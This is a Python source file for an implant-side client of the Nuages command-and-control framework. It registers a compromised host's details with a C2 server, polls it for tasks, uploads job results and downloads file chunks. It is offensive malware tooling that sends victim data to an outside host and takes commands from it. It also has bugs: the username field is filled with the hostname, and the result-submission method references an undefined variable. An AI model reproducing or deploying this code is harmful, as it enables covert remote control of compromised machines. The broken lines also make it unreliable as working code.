import requests
import json

class NuagesC2Direct:
  def __init__(self, connectionString):
    self.connectionString = connectionString
    self.handler = "Direct"

  def getConnectionString(self):
    return self.connectionString
  
  def getHandler(self):
    return self.handler

  def POST(self, url, body):
    headers = {'Content-type': 'application/json'}
    response = requests.post(self.connectionString + url, data = body, verify=True, headers=headers)
    if(response.ok):
      return json.loads(response.content)
    else:
        response.raise_for_status()
  
  def RegisterImplant(self, hostname = "", username = "",  localIp = "", sourceIp = "", os = "", handler = "", connectionString = "", options = {}, supportedPayloads = []):
    implant = {}
    implant['hostname'] = hostname
    implant['username'] = hostname
    implant['localIp'] = localIp
    implant['sourceIp'] = sourceIp
    implant['os'] = os
    implant['handler'] = handler
    implant['connectionString'] = connectionString
    implant['options'] = options
    implant['supportedPayloads'] = supportedPayloads
    jsonData  = self.POST("/implant/register", json.dumps(implant))
    return jsonData["_id"]

  def Heartbeat(self, implantId):
      body = {}
      body['id'] = implantId
      jsonData  = self.POST("/implant/heartbeat", json.dumps(body))
      return jsonData["data"]

  def SubmitJobResult(self, jobId, result = "", moreData = False, error = False, n = 0, data = ""):
      body = {}
      body['id'] = implantId
      body['result'] = result
      body['moreData'] = moreData
      body['error'] = error
      body['data'] = data
      body['n'] = n
      self.POST("/implant/jobresult", json.dumps(body))

  def GetFileChunk(self, fileId, n):
      body = {}
      body['n'] = n
      body['file_id'] = fileId
      jsonData  = self.POST("/implant/chunks", json.dumps(body))
      return jsonData["data"]

